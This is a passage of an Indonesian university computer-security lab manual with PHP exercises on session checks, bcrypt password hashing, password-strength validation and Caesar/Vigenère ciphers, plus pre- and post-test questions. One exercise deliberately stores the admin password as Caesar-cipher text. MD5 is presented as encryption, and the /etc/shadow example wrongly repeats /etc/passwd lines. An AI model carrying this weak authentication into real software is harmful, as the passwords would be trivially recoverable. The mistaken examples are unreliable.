| 2. | CPL 01S01 | CPMK 5.1.1 | Perhatikan potongan kode pada file dashboard.php if (!isset($ SESSION['username'])) { _ header("Location: index.php"); exit(); } Mengapa pengecekan sesi tersebut sangat penting diletakkan di baris paling atas halaman dashboard dalam konteks keamanan komputer? | 25 |
| 3. | CPL 01S01 | CPMK 5.1.1 | Pada file logout 2.php, terdapat fungsi session unset() _ _ dan session destroy() sebelum perintah pengalihan _ (redirect) ke halaman utama. Jelaskan fungsi spesifik dari kedua perintah tersebut saat pengguna mengakhiri sesi masuk mereka! | 25 |

### 1.5. HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL 01-S01 | CPMK 5.1.1 | 20% | 100 | 20 |
| 2. | Praktik | CPL 01-S01 | CPMK 5.1.1 | 30% | 100 | 30 |
| 3. | Post-Test | CPL 01-S01 | CPMK 5.1.1 | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

---

<!-- Halaman 22 -->

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 23 -->

## PRAKTIKUM 2: PASSWORD MANAJEMEN

Pertemuan ke : 2 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 01-S01 | Menjunjung tinggi nilai kemanusiaan untuk menjalankan tugas berdasarkan agama, moral, etika, dan bernegara berdasarkan Pancasila dengan menunjukkan sikap bertanggung jawab atas pekerjaan di bidang keahliannya secara mandiri maupun berkelompok dalam kehidupan bermasyarakat. |
| --- | --- |
| CPMK 5.1.1 | Mampu menganalisa jenis-jenis serangan dan penerapan konsep keamanan untuk menangkal jenis-jenis serangan dan menerapkan prinsip pengamamanan dengan autentikasi berbasis password, token,biometric dan Remote User Authentication. |

2.1. DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu: 1. Memahami prinsip autentikasi. 2. Memahami dan mengimplementasikan manajemen autentikasi berbasisi password. 2.2. INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 01-S01 | CPMK 5.1.1 | Mampu menganalisa jenis-jenis serangan dan penerapan konsep keamanan untuk menangkal jenis-jenis serangan dan menerapkan prinsip pengamamanan dengan autentikasi berbasis password, token,biometric dan Remote User Authentication. |
| --- | --- | --- |

Manajemen password dalam autentikasi adalah proses dan praktik untuk menjaga agar kata sandi pengguna aman, serta meminimalkan risiko akses tidak sah ke sistem atau aplikasi. Ini mencakup bagaimana kata sandi dibuat, disimpan, dikelola, dan digunakan oleh pengguna maupun oleh sistem. Praktik manajemen password yang baik penting untuk melindungi data pengguna dan menghindari serangan terhadap sistem.

---

<!-- Halaman 24 -->

Untuk memastikan keamanan yang memadai, organisasi sering menerapkan kebijakan kata sandi yang mengharuskan pengguna membuat kata sandi yang kuat. Kebijakan ini biasanya meliputi:

• Panjang minimum: Misalnya, setidaknya 8 hingga 12 karakter. • Keragaman karakter: Kata sandi harus mencakup kombinasi huruf besar, huruf kecil, angka, dan simbol khusus. • Penggunaan kata sandi unik: Tidak mengizinkan pengguna menggunakan kata sandi yang sama di beberapa sistem. • Kedaluwarsa kata sandi: Pengguna diharuskan mengganti kata sandi secara berkala (misalnya setiap 90 hari). • Larangan penggunaan ulang kata sandi: Sistem tidak memperbolehkan pengguna menggunakan kata sandi lama. Mengelola kata sandi dengan baik di tingkat pengguna sangat penting untuk menjaga keamanan akun. Beberapa langkah terbaik untuk pengguna:

• Menggunakan pengelola kata sandi (Password Manager): Pengelola kata sandi dapat menyimpan kata sandi secara aman, menghasilkan kata sandi yang kuat, dan mengisi otomatis saat pengguna login ke situs web. Ini mengurangi kebutuhan pengguna untuk mengingat kata sandi yang panjang dan kompleks. • Menggunakan kata sandi yang kuat: Pengguna harus menghindari menggunakan kata sandi yang mudah ditebak seperti "123456", nama mereka sendiri, atau hal-hal umum yang mudah ditebak. • Menghindari penggunaan ulang kata sandi: Setiap akun atau sistem harus memiliki kata sandi yang unik untuk mencegah risiko jika satu akun kompromi. Pengaturan ulang (reset) kata sandi juga memerlukan keamanan yang baik. Jika reset dilakukan melalui email, sistem harus memastikan bahwa link yang dikirim aman dan memiliki masa berlaku yang terbatas. Manajemen password yang efektif tidak hanya mencakup teknologi yang digunakan oleh sistem untuk melindungi kata sandi, tetapi juga kebiasaan pengguna dalam membuat dan menyimpan kata sandi. Kombinasi dari kebijakan yang kuat, teknologi hashing dan enkripsi yang aman, serta edukasi pengguna adalah kunci untuk menjaga keamanan kata sandi dalam autentikasi berbasis web.

Manajemen password pada sistem operasi Linux adalah proses pengaturan, penyimpanan, dan pengamanan kata sandi pengguna untuk menjaga keamanan sistem. Linux memiliki mekanisme dan utilitas bawaan yang membantu mengelola password dengan aman. Beberapa aspek penting dalam manajemen password di Linux mencakup bagaimana kata sandi disimpan, aturan kebijakan kata sandi, serta alat-alat yang digunakan untuk mengelola kata sandi.

Di Linux, kata sandi pengguna tidak disimpan dalam bentuk teks biasa, melainkan dalam bentuk hash. , untuk dapat mengakses system operasi Linux digunakan mekanisme password. Sistem Linux menggunakan file khusus untuk menyimpan informasi akun dan kata sandi missal : /etc/passwd. /etc/passwd: File ini menyimpan informasi tentang pengguna seperti nama pengguna, UID (User ID), GID (Group ID), dan shell default. Dahulu, kata sandi juga disimpan di sini, tetapi karena file ini dapat dibaca oleh semua pengguna, Linux sekarang menggunakan file lain untuk menyimpan hash kata sandi. Contoh isi file /etc/passwd:

root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin: daemon:x:2:2:daemon:/sbin: adm:x:3:4:adm:/var/adm: rms:x:100:100:Richard M Stallman:/home/rms:/bin/bash dmr:x:101:101:Dennis M Ritchie:/home/dmr:/bin/bash linus:x:102:102:Linus Torvalds:/home/linus:/bin/bash

---

<!-- Halaman 25 -->

Keterangan : Field pertama : nama login Field kedua : password yang terenkripsi Field ketiga : User ID Field keempat : Group ID Field kelima : Nama sebenarnya Field Field keenam : Home directory user Field Field ketujuh : User shell

Password login yang terdapat pada file /etc/passwd dienkripsi dengan menggunakan algoritma DES yang telah dimodifikasi. Meskipun demikian hal tersebut tidak mengurangi kemungkinan  assword tersebut dibongkar(crack).

/etc/shadow: File ini menyimpan hash kata sandi secara aman. Hanya pengguna root yang memiliki akses ke file ini. setiap entri di file ini terkait dengan pengguna yang disimpan di /etc/passwd dan berisi informasi seperti: Hash kata sandi, Umur kata sandi (berapa lama kata sandi tersebut berlaku), Informasi kapan kata sandi terakhir kali diubah Berikut ini adalah contoh file /etc/shadow:

root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin: daemon:x:2:2:daemon:/sbin: adm:x:3:4:adm:/var/adm: rms:x:100:100:Richard M Stallman:/home/rms:/bin/bash dmr:x:101:101:Dennis M Ritchie:/home/dmr:/bin/bash linus:x:102:102:Linus Torvalds:/home/linus:/bin/bash

Dengan demikian, penggunaan shadow password akan mempersulit attacker untuk melakukan dictionary-based attack terhadap file password. Selain menggunakan shadow password beberapa istribusi Linux juga menyertakan program hashing MD5 yang menjadikan password yang dimasukkan pemakai dapat berukuran panjang dan relatif mudah diingat karena berupa suatu passphrase. Mekanisme yang telah disediakan sistem operasi tersebut di atas tidaklah bermanfaat bila pemakai tidak menggunakan password yang "baik". Berikut ini adalah beberapa kriteria yang dapat digunakan untuk membuat password yang "baik" :

1. Jangan menggunakan nama login anda dengan segala variasinya. 2. Jangan menggunakan nama pertama atau akhir anda dengan segala variasinya. 3. Jangan menggunakan nama pasangan atau anak anda. 4. Jangan menggunakan informasi lain yang mudah didapat tentang anda, seperti nomor telpon, tanggal lahir. 5. Jangan menggunakan password yang terdiri dairi seluruhnya angka ataupun huruf yang sama. 6. Jangan menggunakan kata-kata yang ada di dalam kamus. Atau daftar kata lainnya. 7. Jangan menggunakan password yang berukuran kurang dari 6 karakter. 8. Gunakan password yang merupakan campuran antara huruf kapital dan huruf kecil. 9. Gunakan password dengan karakter-karakter non alfabet. 10. Gunakan password yang mudah diingat, sehingga tidak perlu ditulis, 11. Gunakan password yang mudah diketikkan, tanpa perlu melihat pada keyboard.

---

<!-- Halaman 26 -->

2.4. HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu: 1. Komputer. 2. XAMPP 3. Notepad/text editor 2.5. PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 01S01 | CPMK 5.1.1 | Apa itu password management? | 30 |
| 2. |  |  | Sebutkan kriteria apa saja yang dapat digunakan untuk membuat password yg baik? | 30 |
| 3. |  |  | Menurut kalian bagaimana cara memanagement password kita agar tidak lupa dan tidak mudah diketahui orang lain? | 40 |

### 2.6. LANGKAH PRAKTIKUM

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL 01S01 | CPMK 5.1.1 | Selesaikan langkah praktikum 1 – 6 | Hasil praktikum langkah 1 – 6 | 100 |

### Langkah-Langkah Praktikum:

1. Buatlah pada Folder baru (htdocs/keamanankomputer_3digitNIM/Pertemua2). 2. Copy tiga file yang ada di pertemuan1 3. Buat file baru bernama test_hash.php untuk melihat perbedaan bagaimana sistem keamanan modern mengenkripsi password menggunakan algoritma standar industri (PASSWORD_BCRYPT).

```
<?php 
$password_asli = "AdminSec123!"; 
 
// Mengubah password menjadi hash yang aman 
$hash_bcrypt = password_hash($password_asli, PASSWORD_BCRYPT); 
 
echo "Password Asli: " . $password_asli . "<br>"; 
echo "Hasil Hash Bcrypt: " . $hash_bcrypt . "<br><br>"; 
 
// Simulasi Verifikasi Password saat Login 
if (password_verify("AdminSec123!", $hash_bcrypt)) { 
    echo "<b>Status:</b> Password Cocok (Login Berhasil!)"; 
} else { 
    echo "<b>Status:</b> Password Salah (Login Ditolak!)"; 
} 
?> 
Figure 3 
```

---

<!-- Halaman 27 -->

### 4. Update auth.php. Perubahan pada auth.php adalah pengecekan kredensial array/database agar

### menggunakan fungsi password_verify(), sehingga sistem tidak lagi membaca password mentah.

```
<?php 
session_start(); 
 
 
// Simulasi database dengan password yang sudah di-hash (Bcrypt) 
// Hash di bawah adalah hasil enkripsi dari password asli: 
"admin123" 
$database_user = [ 
    'username' => 'admin', 
    'password' 
=> 
'$2y$10$q8xNZy0YpiyYP9a4S30uIuSyb5u6CJz.IrYx3Zc5MoJkcJ9z6McCm',  
    'role'     => 'Administrator' 
]; 
 
// Cek apakah form dikirim melalui tombol dengan name="login" 
if (isset($_POST['login'])) { 
    $username = trim($_POST['username']); 
    $password = trim($_POST['password']); 
 
    // Validasi pencocokan username dan verifikasi password hash 
    if 
($username 
=== 
$database_user['username'] 
&& 
password_verify($password, $database_user['password'])) { 
        // Jika Berhasil Login 
        $_SESSION['username'] = $database_user['username']; 
        $_SESSION['role']     = $database_user['role']; 
         
        header("Location: dashboard.php"); 
        exit(); 
    } else { 
        // Jika Gagal (Username salah atau Password salah) 
        $_SESSION['error'] = "Username atau Password salah!"; 
        header("Location: index.php"); 
        exit(); 
    } 
} else { 
    // Jika file diakses langsung tanpa lewat form login 
    header("Location: index.php"); 
    exit(); 
} 
?> 
Figure 3 
```

5. Membuat Validasi Kekuatan Password (Strength Checker). Buat file baru bernama register_check.php untuk melatih mahasiswa bagaimana mencegah user membuat password yang lemah (lemah karena terlalu pendek atau kurang kombinasi).

```
<?php 
function cekKekuatanPassword($password) { 
    $pesan = []; 
     
    // Syarat 1: Minimal 8 karakter 
    if (strlen($password) < 8) { 
        $pesan[] = "Password terlalu pendek (minimal 8 karakter)."; 
    } 
```

---

<!-- Halaman 28 -->

```
    // Syarat 2: Harus mengandung angka 
    if (!preg_match("#[0-9]+#", $password)) { 
        $pesan[] = "Password harus mengandung setidaknya satu 
angka."; 
    } 
    // Syarat 3: Harus mengandung huruf besar 
    if (!preg_match("#[A-Z]+#", $password)) { 
        $pesan[] = "Password harus mengandung setidaknya satu huruf 
besar."; 
    } 
     
    return $pesan; 
} 
 
// Contoh Pengujian 
$password_uji = "lemah"; 
$hasil_cek = cekKekuatanPassword($password_uji); 
 
if (!empty($hasil_cek)) { 
    echo "Password ditolak:<br>"; 
    foreach($hasil_cek as $err) { 
        echo "- " . $err . "<br>"; 
    } 
} else { 
    echo "Password kuat dan diterima!"; 
} 
?> 
Figure 4 
```

6. Selanjutnya, mencoba salah satu  software manajemen password 2.7. POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 01S01 | CPMK 5.1.1 | Pada file auth.php, periksalah bagaimana cara sistem memvalidasi password yang diinput oleh user. Fungsi bawaan PHP apakah yang digunakan untuk mencocokkan password teks biasa dengan hash Bcrypt yang tersimpan di dalam variabel $database user['password']? Tuliskan _ baris kodenya! | 50 |
| 2. | CPL 01S01 | CPMK 5.1.1 | Berdasarkan file register check.php, tuliskan fungsi atau _ kondisi PHP yang digunakan untuk memeriksa apakah sebuah password dan berikan analisis nya. | 50 |

### 2.8. HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |

---

<!-- Halaman 29 -->

| 1. | Pre-Test | CPL 01-S01 | CPMK 5.1.1 | 20% | 100 | 20 |
| --- | --- | --- | --- | --- | --- | --- |
| 2. | Praktik | CPL 01-S01 | CPMK 5.1.1 | 30% | 100 | 30 |
| 3. | Post-Test | CPL 01-S01 | CPMK 5.1.1 | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

---

<!-- Halaman 30 -->

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 32 -->

## PRAKTIKUM 3:      KRIPTOGRAFI KLASIK

Pertemuan ke : 3 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 09-KK02 | Kemampuan merancang dan menganalisis algoritma untuk menyelesaikan permasalahan organisasi secara optimal, serta memilih dan menerapkannya pada bahasa pemrograman tertentu. |
| --- | --- |
| CPMK 5.1.2 | Mengimplementasikan konsep kriptografi, steganografi, digital signature dan manajemen key untuk meningkatkan kemanan dengan bahasa pemrograman tertentu |

| CPL 09KK02 | CPMK 5.1.2 | Mengimplementasikan konsep kriptografi, steganografi, digital signature dan manajemen key untuk meningkatkan kemanan dengan bahasa pemrograman tertentu |
| --- | --- | --- |

### A. Caesar

Metode ini menggunakan pergeseran sederhana, sehingga metode ini tergolong dalam kelompok metode stream. Algoritma dasar dari metode ini sangat simple, setiap kunci diganti dengan huruf ketiga setelah kunci yang bersangkutan. Misalnya kita memiliki plaintext seperti berikut.

I CAME I SAW I CONQUERED Maka kalau kita enkripsikan dengan metode ini, didapatkan cipherteksnya adalah L FDPH L VDZ L FRQTXHUHG

---

<!-- Halaman 33 -->

| Plain : Cipher : | 1 A D | 2 B E | 3 C F | 4 D G | 5 E H | 6 F I | 7 G J | 8 H K | 9 I L | 10 J M | 11 K N | 12 L O | 13 M P | 14 N Q | 15 O R | 16 P S | 17 Q T | 18 R U | 19 S V | 20 T W | 21 U X | 22 V Y | 23 W Z | 24 X A | 25 Y B | 26 Z C |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

Enkripsi : Ek : i → (i+k) mod 26 Dekripsi : Dk : i → (i-k) mod 26

Keterangan : i : huruf yang akan dienkripsi/dekripsi k : kunci (pada Caesar cipher maka kunci adalah 3)

Modulus 26 digunakan untuk plaintext dengan basis 26 karakter. Untuk plainteks dengan basis ASCII maka digunakan modulus 256

### B. Vigenere

Metode ini juga merupakan dasar dari polyalphabetic substitution cipher. Beberapa ketentuan dalam metode ini antara lain :

- Setiap kunci dapat disubstitusi dengan bermacam-macam kunci yang lain. - Menggunakan kata kunci. - Kata kunci digunakan secara berulang. - Kata kunci digunakan untuk menetukan enkripsi setiap alphabet dalam plainteks. - Huruf ke-i dalam plainteks dispesifikasikan oleh alphabet yang digunakan dalam kunci. - Penggunaan alphabet bisa berluang.

Contoh, kita akan melakukan enkripsi pesan plainteks :

Pi : TO BE OR NOT TO BE THAT IS THE QUESTION

Dengan menggunakan kata kunci RELATIONS. Kita mulai dengan menuliskan kunci, berulang kali di bagian atas plaintext message.

| Keyword : | R | E | L | A | T |  | I | O | N | S | R |  | E | L | A | T | I |  | O | N | S | R | E |  | L | A | T | I | O |  | N | S | R | E | L |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Plaintext : | T | O | B | E | O |  | R | N | O | T | T |  | O | B | E | T | H |  | A | T | I | S | T |  | H | E | Q | U | E |  | S | T | I | O | N |
| Ciphertext: | K | S | M | E | H |  | Z | B | B | L | K |  | S | M | E | M | P |  | O | G | A | J | X |  | S | E | J | C | S |  | F | L | Z | S | Y |

### Ek : Ci → (Mi + (Kj – A)) mod 26

Untuk Dekripsi maka:

Pi = (Ci – Ki) mod 26

Keterangan :

Ci : nilai decimal karakter ciphertext ke-i

Pi : nilai decimal karakter  plaintext ke-i

---

<!-- Halaman 34 -->

Ki : nilai decimal karakter kunci ke-i

3.4. HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu: 1. Komputer. 2. Dev C++ 3. Tabel ASCII 3.5. PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 09KK02 | CPMK 5.1.2 | Jelaskan apa itu kriptografi ! | 25 |
| 2. |  |  | Sebutkan dan Jelaskan Jenis - Jenis kriptografi ! | 25 |
| 3. |  |  | Enkripsikan Plaintext Berikut kedalam Caesar Cipher Plaintext : Saya (Nama Lengkap) Mahasiswa Faktultas Teknologi Industri Teknik Informatika Universitas Ahmad Dahlan Kerjakan lengkap dengan langkah2nya ! | 50 |

### 3.6. LANGKAH PRAKTIKUM

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL-07 | CPMK-02 | Selesaikan langkah praktikum 1 – 3 | Hasil praktikum langkah 1 – 3 | 100 |

### Langkah-Langkah Praktikum:

1. Buatlah pada Folder baru (htdocs/keamanankomputer_3digitNIM/Pertemua3). 2. Copy tiga file yang ada di pertemuan1 3. Ubah code dashboard.php

```
<?php 
session_start(); 
// Proteksi halaman: Jika belum login, tendang kembali ke 
index.php[cite: 13] 
if (!isset($_SESSION['username'])) { 
    header("Location: index.php"); 
    exit(); 
} 
 
// Inisialisasi variabel hasil 
$pesan_asal = ""; 
$geser = 3; 
$hasil_proses = ""; 
$aksi = ""; 
 
// Fungsi Enkripsi Caesar Cipher 
```

---

<!-- Halaman 35 -->

```
function caesarEncrypt($text, $shift) { 
    $result = ""; 
    $shift = $shift % 26; 
    for ($i = 0; $i < strlen($text); $i++) { 
        $char = $text[$i]; 
        if (ctype_upper($char)) { 
            $result .= chr((ord($char) + $shift - 65) % 26 + 65); 
        } elseif (ctype_lower($char)) { 
            $result .= chr((ord($char) + $shift - 97) % 26 + 97); 
        } else { 
            $result .= $char; // Karakter selain huruf dibiarkan 
tetap 
        } 
    } 
    return $result; 
} 
 
// Fungsi Dekripsi Caesar Cipher 
function caesarDecrypt($text, $shift) { 
    return caesarEncrypt($text, 26 - ($shift % 26)); 
} 
 
// Proses jika form disubmit 
if (isset($_POST['proses'])) { 
    $pesan_asal = $_POST['teks']; 
    $geser = (int)$_POST['shift']; 
    $aksi = $_POST['aksi']; 
 
    if ($aksi == "encrypt") { 
        $hasil_proses = caesarEncrypt($pesan_asal, $geser); 
    } else { 
        $hasil_proses = caesarDecrypt($pesan_asal, $geser); 
    } 
} 
?> 
<!DOCTYPE html> 
<html lang="id"> 
<head> 
    <meta charset="UTF-8"> 
    <title>Dashboard & Caesar Cipher Tool</title> 
    <style> 
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, 
sans-serif; background: #f9fafb; margin: 0; padding: 20px; display: 
flex; justify-content: center; } 
        .container { width: 600px; background: white; padding: 
30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
} 
        .header { display: flex; justify-content: space-between; 
align-items: center; border-bottom: 1px solid #eee; padding-
bottom: 15px; margin-bottom: 20px; } 
        .btn-logout { background: #dc2626; color: white; text-
decoration: none; padding: 6px 15px; border-radius: 4px; font-
weight: bold; font-size: 14px; } 
        .btn-logout:hover { background: #b91c1c; } 
        .form-group { margin-bottom: 15px; } 
```

---

<!-- Halaman 36 -->

```
        .form-group label { display: block; margin-bottom: 5px; 
color: #4b5563; font-weight: 600; font-size: 14px; } 
        .form-group input, 
.form-group textarea, .form-group 
select { width: 100%; padding: 8px; box-sizing: border-box; border: 
1px solid #d1d5db; border-radius: 5px; font-size: 14px; } 
        .btn-submit { background: #4f46e5; color: white; border: 
none; padding: 10px 15px; border-radius: 5px; font-weight: bold; 
cursor: pointer; width: 100%; } 
        .btn-submit:hover { background: #4338ca; } 
        .result-box { background: #f3f4f6; padding: 15px; border-
radius: 5px; margin-top: 20px; border-left: 4px solid #4f46e5; } 
        .result-box h4 { margin: 0 0 5px 0; color: #1f2937; } 
    </style> 
</head> 
<body> 
 
<div class="container"> 
    <div class="header"> 
        <div> 
            <h3 style="margin:0; color:#1f2937;">Halo, <?php echo 
htmlspecialchars($_SESSION['username']); ?>!</h3> 
            <small 
style="color: 
#6b7280;">Sistem 
Keamanan 
Komputer - Modul Kriptografi</small> 
        </div> 
        <a href="logout.php" class="btn-logout">Logout</a>[cite: 
11] 
    </div> 
 
    <h4>Simulasi Caesar Cipher (Enkripsi & Dekripsi)</h4> 
    <form method="POST" action=""> 
        <div class="form-group"> 
            <label>Masukkan Teks (Plaintext / Ciphertext):</label> 
            <textarea name="teks" rows="3" required><?php echo 
htmlspecialchars($pesan_asal); ?></textarea> 
        </div> 
        <div class="form-group"> 
            <label>Jumlah Pergeseran (Shift Key):</label> 
            <input type="number" name="shift" value="<?php echo 
$geser; ?>" min="1" max="25" required> 
        </div> 
        <div class="form-group"> 
            <label>Pilih Aksi:</label> 
            <select name="aksi"> 
                <option value="encrypt" <?php if($aksi=="encrypt") 
echo "selected"; ?>>Enkripsi (Plaintext -> Ciphertext)</option> 
                <option value="decrypt" <?php if($aksi=="decrypt") 
echo "selected"; ?>>Dekripsi (Ciphertext -> Plaintext)</option> 
            </select> 
        </div> 
        <button 
type="submit" 
name="proses" 
class="btn-
submit">Jalankan Proses</button> 
    </form> 
 
    <?php if (isset($_POST['proses'])): ?> 
        <div class="result-box"> 
            <h4>Hasil Output:</h4> 
```

---

<!-- Halaman 37 -->

```
            <p 
style="word-break: 
break-all; 
font-family: 
monospace; font-size: 16px; color: #047857; margin: 0;"> 
                <?php echo htmlspecialchars($hasil_proses); ?> 
            </p> 
        </div> 
    <?php endif; ?> 
</div> 
 
</body> 
</html> 
Figure 5 
```

4. Kemudian lakukan percobaan bagaimana cesar chiper melakukan proses enkripsi dan dekripsi.

### Dengan plaintext = “admin123”. Catat hasil enkripsi

### 5. Kemudian pada kode auth.php ubah menjadi auth2.php

### 6. Setelah diubah buat file baru dengan nama auth2.php

```
<?php 
```

---

<!-- Halaman 38 -->

```
session_start(); 
 
// Fungsi Enkripsi Caesar Cipher 
function caesarEncrypt($text, $shift) { 
    $result = ""; 
    $shift = $shift % 26; 
    for ($i = 0; $i < strlen($text); $i++) { 
        $char = $text[$i]; 
        if (ctype_upper($char)) { 
            $result .= chr((ord($char) + $shift - 65) % 26 + 65); 
        } elseif (ctype_lower($char)) { 
            $result .= chr((ord($char) + $shift - 97) % 26 + 97); 
        } else { 
            $result .= $char; // Karakter selain huruf dibiarkan 
tetap (seperti angka) 
        } 
    } 
    return $result; 
} 
 
// Kunci pergeseran (Shift Key) untuk Caesar Cipher 
$shift_key = 3; 
 
// Simulasi Database: Password asli "admin123" telah dienkripsi 
dengan Caesar Cipher (shift 3)  
// Hasil enkripsi "admin123" dengan shift 3 adalah "dgplq123" 
$database_user = [ 
    'username' => 'admin', 
    'password' => 'dgplq123',  
    'role'     => 'Administrator' 
]; 
 
// Cek apakah form dikirim melalui tombol login[cite: 14] 
if (isset($_POST['login'])) { 
    $username = trim($_POST['username']); 
    $password_input = trim($_POST['password']); 
 
    // Enkripsi password yang diketik user menggunakan Caesar 
Cipher 
    $password_ciphertext = caesarEncrypt($password_input, 
$shift_key); 
 
    // Validasi pencocokan username dan ciphertext password 
    if ($username === $database_user['username'] && 
$password_ciphertext === $database_user['password']) { 
        // Jika Berhasil Login 
        $_SESSION['username'] = $database_user['username']; 
        $_SESSION['role']     = $database_user['role']; 
         
        header("Location: dashboard.php"); 
        exit(); 
    } else { 
        // Jika Gagal (Username atau Password salah) 
        $_SESSION['error'] = "Username atau Password salah!"; 
        header("Location: index.php"); 
        exit(); 
```

---

<!-- Halaman 39 -->

```
    } 
} else { 
    // Jika file diakses langsung tanpa lewat form login[cite: 
14] 
    header("Location: index.php"); 
    exit(); 
} 
?> 
Figure 6 
```

### 7. Kemudian coba lagi dengan menggunakan username : admin, password : (Hasil enkripsi di

### Langkah sebelum nya).

### 3.7. POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL-07 | CPMK-02 | Pada file auth2.php, password yang diinput oleh pengguna tidak langsung dibandingkan secara plaintext, melainkan dienkripsi terlebih dahulu menggunakan fungsi caesarEncrypt($password input, $shift key). _ _ Berdasarkan logika tersebut, jika seorang pengguna memasukkan password admin123 dengan nilai pergeseran (shift) 3, berapakah bentuk ciphertext (hasil enkripsi) yang harus tersimpan di dalam variabel $database user['password'] agar login dinyatakan _ berhasil? | 50 |
| 2. | CPL-07 | CPMK-02 | Jelaskan potongan kode dari dashboard.php berikut dan bagiamana cara kerja nya. | 50 |

### 3.8. HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL-07 | CPMK-02 | 20% | 100 | 20 |
| 2. | Praktik | CPL-07 | CPMK-02 | 30% | 100 | 30 |

---

<!-- Halaman 40 -->

| 3. | Post-Test | CPL-07 | CPMK-02 | 50% | 100 | 50 |
| --- | --- | --- | --- | --- | --- | --- |
| Total Nilai |  |  |  |  |  | 100 |

---

<!-- Halaman 41 -->

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 42 -->

## PRAKTIKUM 4:      KRIPTOGRAFI MODERN

Pertemuan ke : 4 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 09-KK02 | Kemampuan merancang dan menganalisis algoritma untuk menyelesaikan permasalahan organisasi secara optimal, serta memilih dan menerapkannya pada bahasa pemrograman tertentu. |
| --- | --- |
| CPMK 5.1.2 | Mengimplementasikan konsep kriptografi, steganografi, digital signature dan manajemen key untuk meningkatkan kemanan dengan bahasa pemrograman tertentu |

4.1. DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu:

1. Menjelaskan konsep kriptografi modern MD5 untuk proses enkripsi dan dekripsi. 2. Menerapkan penggunaan konsep kriptografi modern MD5 untuk proses enkripsi dan dekripsi

4.2. INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 09-KK02 | CPMK 5.1.2 | Mengimplementasikan konsep kriptografi, steganografi, digital signature dan manajemen key untuk meningkatkan kemanan dengan bahasa pemrograman tertentu |
| --- | --- | --- |

Dalam kriptografi, MD5 (Message-Digest algorithm 5) ialah fungsi hash kriptografik yang digunakan secara luas dengan hash value 128-bit. Pada standard Internet (RFC 1321), MD5 telah dimanfaatkan secara bermacam-macam pada aplikasi keamanan, dan MD5 juga umum digunakan untuk melakaukan autentikasi suatu data digital atau pengujian integritas sebuah file.

